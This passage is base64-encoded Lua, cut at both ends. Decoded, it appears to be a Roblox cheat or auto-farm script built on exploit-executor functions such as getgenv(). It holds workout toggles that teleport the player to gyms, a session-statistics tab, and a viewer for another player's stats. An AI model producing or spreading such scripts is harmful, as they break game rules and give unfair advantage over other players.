yb3Bkb3duOkFkZChneW1OYW1lKQogICAgZW5kCiAgICAKICAgIC0tIENyZWF0ZSB0b2dnbGUgZm9yIHdvcmtvdXQKICAgIGxvY2FsIHRvZ2dsZU5hbWUgPSB3b3Jrb3V0VHlwZSAuLiAiR3ltVG9nZ2xlIgogICAgbG9jYWwgdG9nZ2xlID0gZmFybUd5bXNGb2xkZXI6QWRkU3dpdGNoKHNwYW5pc2hXb3Jrb3V0TmFtZSwgZnVuY3Rpb24oYm9vbCkKICAgICAgICBnZXRnZW52KCkud29ya2luZ0d5bSA9IGJvb2wKICAgICAgICBnZXRnZW52KCkuY3VycmVudFdvcmtvdXRUeXBlID0gd29ya291dFR5cGUKICAgICAgICAKICAgICAgICBpZiBib29sIHRoZW4KICAgICAgICAgICAgbG9jYWwgc2VsZWN0ZWRHeW0gPSBfR1sic2VsZWN0ZWQiIC4uIHN0cmluZy5nc3ViKHdvcmtvdXRUeXBlLCAiICIsICIiKSAuLiAiR3ltIl0gb3IgZ3ltTG9jYXRpb25zWzFdCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBNYWtlIHN1cmUgd2UgaGF2ZSBhIHZhbGlkIHBvc2l0aW9uCiAgICAgICAgICAgIGlmIHdvcmtvdXRQb3NpdGlvbnNbd29ya291dFR5cGVdIGFuZCB3b3Jrb3V0UG9zaXRpb25zW3dvcmtvdXRUeXBlXVtzZWxlY3RlZEd5bV0gdGhlbgogICAgICAgICAgICAgICAgLS0gU3RvcCBhbnkgb3RoZXIgd29ya291dCB0aGF0IG1pZ2h0IGJlIHJ1bm5pbmcKICAgICAgICAgICAgICAgIGZvciBvdGhlclR5cGUsIG90aGVyVG9nZ2xlIGluIHBhaXJzKGd5bVRvZ2dsZXMpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgb3RoZXJUeXBlIH49IHdvcmtvdXRUeXBlIGFuZCBvdGhlclRvZ2dsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIG90aGVyVG9nZ2xlOlNldChmYWxzZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBTdGFydCB0aGUgd29ya291dAogICAgICAgICAgICAgICAgdGVsZXBvcnRBbmRTdGFydCh3b3Jrb3V0VHlwZSwgd29ya291dFBvc2l0aW9uc1t3b3Jrb3V0VHlwZV1bc2VsZWN0ZWRHeW1dKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAtLSBOb3RpZnkgdXNlciBpZiBwb3NpdGlvbiBpcyBub3QgZm91bmQKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiRXJyb3IiLAogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiUG9zaXRpb24gbm90IGZvdW5kIGZvciAiIC4uIHdvcmtvdXRUeXBlIC4uICIgaW4gIiAuLiBzZWxlY3RlZEd5bSwKICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBTdG9yZSByZWZlcmVuY2UgdG8gdG9nZ2xlCiAgICBneW1Ub2dnbGVzW3dvcmtvdXRUeXBlXSA9IHRvZ2dsZQplbmQKCmxvY2FsIHN0YXRzID0gd2luZG93OkFkZFRhYigiU3RhdHMiKQpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJsZWFkZXJzdGF0cyIpCmxvY2FsIHN0cmVuZ3RoU3RhdCA9IGxlYWRlcnN0YXRzOldhaXRGb3JDaGlsZCgiU3RyZW5ndGgiKQpsb2NhbCByZWJpcnRoc1N0YXQgPSBsZWFkZXJzdGF0czpXYWl0Rm9yQ2hpbGQoIlJlYmlydGhzIikKbG9jYWwgZHVyYWJpbGl0eVN0YXQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJEdXJhYmlsaXR5IikKbG9jYWwga2lsbHNTdGF0ID0gbGVhZGVyc3RhdHM6V2FpdEZvckNoaWxkKCJLaWxscyIpCmxvY2FsIGFnaWxpdHlTdGF0ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiQWdpbGl0eSIpCmxvY2FsIGV2aWxLYXJtYVN0YXQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJldmlsS2FybWEiKQpsb2NhbCBnb29kS2FybWFTdGF0ID0gcGxheWVyOldhaXRGb3JDaGlsZCgiZ29vZEthcm1hIikKbG9jYWwgYnJhd2xzU3RhdCA9IGxlYWRlcnN0YXRzOldhaXRGb3JDaGlsZCgiQnJhd2xzIikKCmxvY2FsIGZ1bmN0aW9uIEFiYnJldk51bWJlcihudW0pCiAgICBsb2NhbCBhYmJyZXYgPSB7IiIsICJLIiwgIk0iLCAiQiIsICJUIiwgIlFhIiwgIlFpIn0KICAgIGxvY2FsIGkgPSAxCiAgICB3aGlsZSBudW0gPj0gMTAwMCBhbmQgaSA8ICNhYmJyZXYgZG8KICAgICAgICBudW0gPSBudW0gLyAxMDAwCiAgICAgICAgaSA9IGkgKyAxCiAgICBlbmQKICAgIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmJXMiLCBudW0sIGFiYnJldltpXSkKZW5kCgpzdGF0czpBZGRMYWJlbCgi4o+x77iPIFNlc3Npb24gU3RhdGlzdGljcyIpLlRleHRTaXplID0gMzAKbG9jYWwgc3RvcHdhdGNoTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiU2Vzc2lvbiBUaW1lOiAwZCAwaCAwbSAwcyIpCnN0b3B3YXRjaExhYmVsLlRleHRTaXplID0gMjAKCmxvY2FsIGN1c3RvbVRpbWVyTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiQ3VzdG9tIFRpbWVyOiBOb3Qgc3RhcnRlZCIpCmN1c3RvbVRpbWVyTGFiZWwuVGV4dFNpemUgPSAyMAoKbG9jYWwgaXNDdXN0b21SdW5uaW5nID0gZmFsc2UKbG9jYWwgY3VzdG9tU3RhcnQgPSAwCmxvY2FsIGN1c3RvbUVsYXBzZWQgPSAwCgpzdGF0czpBZGRCdXR0b24oIlN0YXJ0L1N0b3AgQ3VzdG9tIFRpbWVyIiwgZnVuY3Rpb24oKQogICAgaWYgbm90IGlzQ3VzdG9tUnVubmluZyB0aGVuCiAgICAgICAgaXNDdXN0b21SdW5uaW5nID0gdHJ1ZQogICAgICAgIGN1c3RvbVN0YXJ0ID0gdGljaygpIC0gY3VzdG9tRWxhcHNlZAogICAgZWxzZQogICAgICAgIGlzQ3VzdG9tUnVubmluZyA9IGZhbHNlCiAgICAgICAgY3VzdG9tRWxhcHNlZCA9IHRpY2soKSAtIGN1c3RvbVN0YXJ0CiAgICBlbmQKZW5kKQoKc3RhdHM6QWRkQnV0dG9uKCJSZXNldCBDdXN0b20gVGltZXIiLCBmdW5jdGlvbigpCiAgICBpc0N1c3RvbVJ1bm5pbmcgPSBmYWxzZQogICAgY3VzdG9tU3RhcnQgPSAwCiAgICBjdXN0b21FbGFwc2VkID0gMAogICAgY3VzdG9tVGltZXJMYWJlbC5UZXh0ID0gIkN1c3RvbSBUaW1lcjogTm90IHN0YXJ0ZWQiCmVuZCkKCmxvY2FsIHJlc2V0U2Vzc2lvbiA9IGZhbHNlCnN0YXRzOkFkZEJ1dHRvbigiUmVzZXQgU2Vzc2lvbiBTdGF0cyIsIGZ1bmN0aW9uKCkKICAgIHJlc2V0U2Vzc2lvbiA9IHRydWUKZW5kKQoKc3RhdHM6QWRkTGFiZWwoIi0tLS0tLS0tLS0tLS0tLS0tLSIpLlRleHRTaXplID0gMTQKCnN0YXRzOkFkZExhYmVsKCJQcm9qZWN0ZWQgU3RhdHMiKS5UZXh0U2l6ZSA9IDMwCmxvY2FsIHByb2plY3RlZFN0cmVuZ3RoTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiU3RyZW5ndGggUGFjZTogLSIpCnByb2plY3RlZFN0cmVuZ3RoTGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBwcm9qZWN0ZWREdXJhYmlsaXR5TGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiRHVyYWJpbGl0eSBQYWNlOiAtIikKcHJvamVjdGVkRHVyYWJpbGl0eUxhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgcHJvamVjdGVkUmViaXJ0aHNMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJSZWJpcnRoIFBhY2U6IC0iKQpwcm9qZWN0ZWRSZWJpcnRoc0xhYmVsLlRleHRTaXplID0gMjAKCnN0YXRzOkFkZExhYmVsKCItLS0tLS0tLS0tLS0tLS0tLS0iKS5UZXh0U2l6ZSA9IDE0CgpzdGF0czpBZGRMYWJlbCgiTGVhZGVyYm9hcmQgU3RhdHMiKS5UZXh0U2l6ZSA9IDMwCmxvY2FsIHN0cmVuZ3RoTGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiU3RyZW5ndGg6IC0iKQpzdHJlbmd0aExhYmVsLlRleHRTaXplID0gMjAKbG9jYWwgcmViaXJ0aHNMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJSZWJpcnRoczogLSIpCnJlYmlydGhzTGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBraWxsc0xhYmVsID0gc3RhdHM6QWRkTGFiZWwoIktpbGxzOiAtIikKa2lsbHNMYWJlbC5UZXh0U2l6ZSA9IDIwCmxvY2FsIGJyYXdsc0xhYmVsID0gc3RhdHM6QWRkTGFiZWwoIkJyYXdsczogLSIpCmJyYXdsc0xhYmVsLlRleHRTaXplID0gMjAKCnN0YXRzOkFkZExhYmVsKCItLS0tLS0tLS0tLS0tLS0tLS0iKS5UZXh0U2l6ZSA9IDE0CgpzdGF0czpBZGRMYWJlbCgiUGxheWVyIFN0YXRzIikuVGV4dFNpemUgPSAzMApsb2NhbCBnb29kS2FybWFMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJHb29kIEthcm1hOiAtIikKZ29vZEthcm1hTGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBldmlsS2FybWFMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJFdmlsIEthcm1hOiAtIikKZXZpbEthcm1hTGFiZWwuVGV4dFNpemUgPSAyMApsb2NhbCBkdXJhYmlsaXR5TGFiZWwgPSBzdGF0czpBZGRMYWJlbCgiRHVyYWJpbGl0eTogLSIpCmR1cmFiaWxpdHlMYWJlbC5UZXh0U2l6ZSA9IDIwCmxvY2FsIGFnaWxpdHlMYWJlbCA9IHN0YXRzOkFkZExhYmVsKCJBZ2lsaXR5OiAtIikKYWdpbGl0eUxhYmVsLlRleHRTaXplID0gMjAKCmxvY2FsIHN0YXJ0VGltZSA9IHRpY2soKQpsb2NhbCBpbml0aWFsU3RyZW5ndGggPSBzdHJlbmd0aFN0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbER1cmFiaWxpdHkgPSBkdXJhYmlsaXR5U3RhdC5WYWx1ZQpsb2NhbCBpbml0aWFsUmViaXJ0aHMgPSByZWJpcnRoc1N0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbEtpbGxzID0ga2lsbHNTdGF0LlZhbHVlCmxvY2FsIGluaXRpYWxBZ2lsaXR5ID0gYWdpbGl0eVN0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbEV2aWxLYXJtYSA9IGV2aWxLYXJtYVN0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbEdvb2RLYXJtYSA9IGdvb2RLYXJtYVN0YXQuVmFsdWUKbG9jYWwgaW5pdGlhbEJyYXdscyA9IGJyYXdsc1N0YXQuVmFsdWUKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgbG9jYWwgbGFzdFVwZGF0ZSA9IDAKICAgIHdoaWxlIHRhc2sud2FpdCgwLjIpIGRvCiAgICAgICAgbG9jYWwgZWxhcHNlZFRpbWUgPSB0aWNrKCkgLSBzdGFydFRpbWUKICAgICAgICBsb2NhbCBkYXlzID0gbWF0aC5mbG9vcihlbGFwc2VkVGltZSAvICgyNCAqIDM2MDApKQogICAgICAgIGxvY2FsIGhvdXJzID0gbWF0aC5mbG9vcigoZWxhcHNlZFRpbWUgJSAoMjQgKiAzNjAwKSkgLyAzNjAwKQogICAgICAgIGxvY2FsIG1pbnV0ZXMgPSBtYXRoLmZsb29yKChlbGFwc2VkVGltZSAlIDM2MDApIC8gNjApCiAgICAgICAgbG9jYWwgc2Vjb25kcyA9IG1hdGguZmxvb3IoZWxhcHNlZFRpbWUgJSA2MCkKICAgICAgICBzdG9wd2F0Y2hMYWJlbC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgiU2Vzc2lvbiBUaW1lOiAlZGQgJWRoICVkbSAlZHMiLCBkYXlzLCBob3VycywgbWludXRlcywgc2Vjb25kcykKCiAgICAgICAgaWYgaXNDdXN0b21SdW5uaW5nIHRoZW4KICAgICAgICAgICAgY3VzdG9tRWxhcHNlZCA9IHRpY2soKSAtIGN1c3RvbVN0YXJ0CiAgICAgICAgZW5kCiAgICAgICAgaWYgY3VzdG9tRWxhcHNlZCA+IDAgdGhlbgogICAgICAgICAgICBsb2NhbCBkID0gbWF0aC5mbG9vcihjdXN0b21FbGFwc2VkIC8gKDI0ICogMzYwMCkpCiAgICAgICAgICAgIGxvY2FsIGggPSBtYXRoLmZsb29yKChjdXN0b21FbGFwc2VkICUgKDI0ICogMzYwMCkpIC8gMzYwMCkKICAgICAgICAgICAgbG9jYWwgbSA9IG1hdGguZmxvb3IoKGN1c3RvbUVsYXBzZWQgJSAzNjAwKSAvIDYwKQogICAgICAgICAgICBsb2NhbCBzID0gbWF0aC5mbG9vcihjdXN0b21FbGFwc2VkICUgNjApCiAgICAgICAgICAgIGN1c3RvbVRpbWVyTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIkN1c3RvbSBUaW1lcjogJWRkICVkaCAlZG0gJWRzIiwgZCwgaCwgbSwgcykKICAgICAgICBlbmQKCiAgICAgICAgaWYgcmVzZXRTZXNzaW9uIHRoZW4KICAgICAgICAgICAgc3RhcnRUaW1lID0gdGljaygpCiAgICAgICAgICAgIGluaXRpYWxTdHJlbmd0aCA9IHN0cmVuZ3RoU3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsRHVyYWJpbGl0eSA9IGR1cmFiaWxpdHlTdGF0LlZhbHVlCiAgICAgICAgICAgIGluaXRpYWxSZWJpcnRocyA9IHJlYmlydGhzU3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsS2lsbHMgPSBraWxsc1N0YXQuVmFsdWUKICAgICAgICAgICAgaW5pdGlhbEFnaWxpdHkgPSBhZ2lsaXR5U3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsRXZpbEthcm1hID0gZXZpbEthcm1hU3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsR29vZEthcm1hID0gZ29vZEthcm1hU3RhdC5WYWx1ZQogICAgICAgICAgICBpbml0aWFsQnJhd2xzID0gYnJhd2xzU3RhdC5WYWx1ZQogICAgICAgICAgICByZXNldFNlc3Npb24gPSBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBjU3RyID0gc3RyZW5ndGhTdGF0LlZhbHVlCiAgICAgICAgbG9jYWwgY1JlYiA9IHJlYmlydGhzU3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNEdXIgPSBkdXJhYmlsaXR5U3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNLaWxscyA9IGtpbGxzU3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNBZ2kgPSBhZ2lsaXR5U3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNFdmlsID0gZXZpbEthcm1hU3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNHb29kID0gZ29vZEthcm1hU3RhdC5WYWx1ZQogICAgICAgIGxvY2FsIGNCcmF3bCA9IGJyYXdsc1N0YXQuVmFsdWUKCiAgICAgICAgbG9jYWwgZFN0ciA9IGNTdHIgLSBpbml0aWFsU3RyZW5ndGgKICAgICAgICBsb2NhbCBkRHVyID0gY0R1ciAtIGluaXRpYWxEdXJhYmlsaXR5CiAgICAgICAgbG9jYWwgZFJlYiA9IGNSZWIgLSBpbml0aWFsUmViaXJ0aHMKICAgICAgICBsb2NhbCBkS2lsbHMgPSBjS2lsbHMgLSBpbml0aWFsS2lsbHMKICAgICAgICBsb2NhbCBkQWdpID0gY0FnaSAtIGluaXRpYWxBZ2lsaXR5CiAgICAgICAgbG9jYWwgZEV2aWwgPSBjRXZpbCAtIGluaXRpYWxFdmlsS2FybWEKICAgICAgICBsb2NhbCBkR29vZCA9IGNHb29kIC0gaW5pdGlhbEdvb2RLYXJtYQogICAgICAgIGxvY2FsIGRCcmF3bCA9IGNCcmF3bCAtIGluaXRpYWxCcmF3bHMKCiAgICAgICAgc3RyZW5ndGhMYWJlbC5UZXh0ID0gIlN0cmVuZ3RoOiAiIC4uIEFiYnJldk51bWJlcihjU3RyKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRTdHIpCiAgICAgICAgcmViaXJ0aHNMYWJlbC5UZXh0ID0gIlJlYmlydGhzOiAiIC4uIEFiYnJldk51bWJlcihjUmViKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRSZWIpCiAgICAgICAga2lsbHNMYWJlbC5UZXh0ID0gIktpbGxzOiAiIC4uIEFiYnJldk51bWJlcihjS2lsbHMpIC4uICIgfCArIiAuLiBBYmJyZXZOdW1iZXIoZEtpbGxzKQogICAgICAgIGJyYXdsc0xhYmVsLlRleHQgPSAiQnJhd2xzOiAiIC4uIEFiYnJldk51bWJlcihjQnJhd2wpIC4uICIgfCArIiAuLiBBYmJyZXZOdW1iZXIoZEJyYXdsKQoKICAgICAgICBnb29kS2FybWFMYWJlbC5UZXh0ID0gIkdvb2QgS2FybWE6ICIgLi4gQWJicmV2TnVtYmVyKGNHb29kKSAuLiAiIHwgKyIgLi4gQWJicmV2TnVtYmVyKGRHb29kKQogICAgICAgIGV2aWxLYXJtYUxhYmVsLlRleHQgPSAiRXZpbCBLYXJtYTogIiAuLiBBYmJyZXZOdW1iZXIoY0V2aWwpIC4uICIgfCArIiAuLiBBYmJyZXZOdW1iZXIoZEV2aWwpCiAgICAgICAgZHVyYWJpbGl0eUxhYmVsLlRleHQgPSAiRHVyYWJpbGl0eTogIiAuLiBBYmJyZXZOdW1iZXIoY0R1cikgLi4gIiB8ICsiIC4uIEFiYnJldk51bWJlcihkRHVyKQogICAgICAgIGFnaWxpdHlMYWJlbC5UZXh0ID0gIkFnaWxpdHk6ICIgLi4gQWJicmV2TnVtYmVyKGNBZ2kpIC4uICIgfCArIiAuLiBBYmJyZXZOdW1iZXIoZEFnaSkKCiAgICAgICAgaWYgdGljaygpIC0gbGFzdFVwZGF0ZSA+PSA2IHRoZW4KICAgICAgICAgICAgbGFzdFVwZGF0ZSA9IHRpY2soKQogICAgICAgICAgICBsb2NhbCBzU2VjID0gZFN0ciAvIGVsYXBzZWRUaW1lCiAgICAgICAgICAgIGxvY2FsIGRTZWMgPSBkRHVyIC8gZWxhcHNlZFRpbWUKICAgICAgICAgICAgbG9jYWwgclNlYyA9IGRSZWIgLyBlbGFwc2VkVGltZQoKICAgICAgICAgICAgbG9jYWwgaCA9IDM2MDAKICAgICAgICAgICAgbG9jYWwgZCA9IDg2NDAwCgogICAgICAgICAgICBwcm9qZWN0ZWRTdHJlbmd0aExhYmVsLlRleHQgPSAiU3RyZW5ndGggUGFjZTogIiAuLiBBYmJyZXZOdW1iZXIobWF0aC5mbG9vcihzU2VjICogaCkpIC4uICIvaCB8ICIgLi4gQWJicmV2TnVtYmVyKG1hdGguZmxvb3Ioc1NlYyAqIGQpKSAuLiAiL2QiCiAgICAgICAgICAgIHByb2plY3RlZER1cmFiaWxpdHlMYWJlbC5UZXh0ID0gIkR1cmFiaWxpdHkgUGFjZTogIiAuLiBBYmJyZXZOdW1iZXIobWF0aC5mbG9vcihkU2VjICogaCkpIC4uICIvaCB8ICIgLi4gQWJicmV2TnVtYmVyKG1hdGguZmxvb3IoZFNlYyAqIGQpKSAuLiAiL2QiCiAgICAgICAgICAgIHByb2plY3RlZFJlYmlydGhzTGFiZWwuVGV4dCA9ICJSZWJpcnRoIFBhY2U6ICIgLi4gQWJicmV2TnVtYmVyKG1hdGguZmxvb3IoclNlYyAqIGgpKSAuLiAiL2ggfCAiIC4uIEFiYnJldk51bWJlcihtYXRoLmZsb29yKHJTZWMgKiBkKSkgLi4gIi9kIgogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGVzdGFkaXN0aWNhcyA9IHdpbmRvdzpBZGRUYWIoIlNwZWNzIikKCmxvY2FsIFNlbGVjdFBsYXllck5hbWUgPSAiIgoKbG9jYWwgUGxheWVyRHJvcCA9IGVzdGFkaXN0aWNhczpBZGREcm9wZG93bigiU2VsZWN0IFBsYXllciIsIGZ1bmN0aW9uKFZhbHVlKQogICAgU2VsZWN0UGxheWVyTmFtZSA9IFZhbHVlOm1hdGNoKCJ8ICguKykiKQogICAgcHJldmlvdXNWYWx1ZXMgPSB7fQplbmQpCgpsb2NhbCBQbGF5ZXJzbGlzdCA9IHt9CmZvciBfLCBQbHIgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpKSBkbwogICAgbG9jYWwgZGlzcGxheU5hbWUgPSBQbHIuRGlzcGxheU5hbWUgLi4gIiB8ICIgLi4gUGxyLk5hbWUKICAgIHRhYmxlLmluc2VydChQbGF5ZXJzbGlzdCwgZGlzcGxheU5hbWUpCmVuZApmb3IgXywgQWRkUGxyIGluIGlwYWlycyhQbGF5ZXJzbGlzdCkgZG8KICAgIFBsYXllckRyb3A6QWRkKEFkZFBscikKZW5kCgpsb2NhbCBmdW5jdGlvbiBGb3JtYXROdW1iZXJXaXRoQ29tbWFzKG51bWJlcikKICAgIGxvY2FsIGZvcm1hdHRlZCA9IHRvc3RyaW5nKG51bWJlcik6cmV2ZXJzZSgpOmdzdWIoIiglZCVkJWQpIiwgIiUxLCIpOnJldmVyc2UoKQogICAgcmV0dXJuIGZvcm1hdHRlZDpnc3ViKCJeLCIsICIiKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEZvcm1hdEFiYnJldmlhdGVkKG51bWJlcikKICAgIGxvY2FsIGFiYnJldmlhdGlvbnMgPSB7IiIsICJLIiwgIk0iLCAiQiIsICJUIiwgIlFhIiwgIlFpIn0KICAgIGxvY2FsIGFiYnJldmlhdGlvbkluZGV4ID0gMQogICAgd2hpbGUgbnVtYmVyID49IDEwMDAgZG8KICAgICAgICBudW1iZXIgPSBudW1iZXIgLyAxMDAwCiAgICAgICAgYWJicmV2aWF0aW9uSW5kZXggPSBhYmJyZXZpYXRpb25JbmRleCArIDEKICAgIGVuZAogICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMmYiLCBudW1iZXIpIC4uIGFiYnJldmlhdGlvbnNbYWJicmV2aWF0aW9uSW5kZXhdCmVuZAoKbG9jYWwgZnVuY3Rpb24gRm9ybWF0RGlzcGxheSh2YWx1ZSkKICAgIGxvY2FsIG5vcm1hbCA9IEZvcm1hdE51bWJlcldpdGhDb21tYXModmFsdWUpCiAgICBsb2NhbCBhYmJyZXZpYXRlZCA9IEZvcm1hdEFiYnJldmlhdGVkKHZhbHVlKQogICAgcmV0dXJuICJbICIgLi4gbm9ybWFsIC4uICIgfCAiIC4uIGFiYnJldmlhdGVkIC4uICIgXSIKZW5kCgpsb2NhbCBwcmV2aW91c1ZhbHVlcyA9IHt9Cgpsb2NhbCBVcGRhdGUgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTEgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTIgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTMgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTQgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTUgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTYgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTkgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTEwID0gZXN0YWRpc3RpY2FzOkFkZExhYmVsKCIiKQpsb2NhbCBVcGRhdGUxMSA9IGVzdGFkaXN0aWNhczpBZGRMYWJlbCgiIikKbG9jYWwgVXBkYXRlMTIgPSBlc3RhZGlzdGljYXM6QWRkTGFiZWwoIiIpCmxvY2FsIFVwZGF0ZTEzID0gZXN0YWRpc3RpY2FzOkFkZExhYmVsKCIiKQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0YXNrLndhaXQoMCkgZG8KICAgICAgICBpZiBTZWxlY3RQbGF5ZXJOYW1lIH49ICIiIHRoZW4KICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzOkZpbmRGaXJzdENoaWxkKFNlbGVjdFBsYXllck5hbWUpCiAgICAgICAgICAgIGlmIHBsYXllciB0aGVuCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkdlbXMiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlMS5UZXh0ID0gIkdlbXM6ICIgLi4gRm9ybWF0RGlzcGxheShwbGF5ZXIuR2Vtcy5WYWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJBZ2lsaXR5IikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTMuVGV4dCA9ICJBZ2lsaXR5OiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLkFnaWxpdHkuVmFsdWUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIHBsYXllcjpGaW5kRmlyc3RDaGlsZCgiRHVyYWJpbGl0eSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGU0LlRleHQgPSAiRHVyYWJpbGl0eTogIiAuLiBGb3JtYXREaXNwbGF5KHBsYXllci5EdXJhYmlsaXR5LlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIm11c2NsZUtpbmdUaW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTYuVGV4dCA9ICJNdXNjbGUgS2luZyBUaW1lOiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLm11c2NsZUtpbmdUaW1lLlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImN1c3RvbVNpemUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlMTAuVGV4dCA9ICJDdXN0b20gU2l6ZTogIiAuLiBGb3JtYXREaXNwbGF5KHBsYXllci5jdXN0b21TaXplLlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImN1c3RvbVNwZWVkIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTExLlRleHQgPSAiQ3VzdG9tIFNwZWVkOiAiIC4uIEZvcm1hdERpc3BsYXkocGxheWVyLmN1c3RvbVNwZWVkLlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImV2aWxLYXJtYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGUxMi5UZXh0ID0gIkV2aWwgS2FybWE6ICIgLi4gRm9ybWF0RGlzcGxheShwbGF5ZXIuZXZpbEthcm1hLlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImdvb2RLYXJtYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBVcGRhdGUxMy5UZXh0ID0gIkdvb2QgS2FybWE6ICIgLi4gRm9ybWF0RGlzcGxheShwbGF5ZXIuZ29vZEthcm1hLlZhbHVlKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgbGVhZGVyc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgICAgICAgICAgICAgIGlmIGxlYWRlcnN0YXRzIHRoZW4KICAgICAgICAgICAgICAgICAgICBpZiBsZWFkZXJzdGF0czpGaW5kRmlyc3RDaGlsZCgiU3RyZW5ndGgiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFVwZGF0ZS5UZXh0ID0gIlN0cmVuZ3RoOiAiIC4uIEZvcm1hdERpc3BsYXkobGV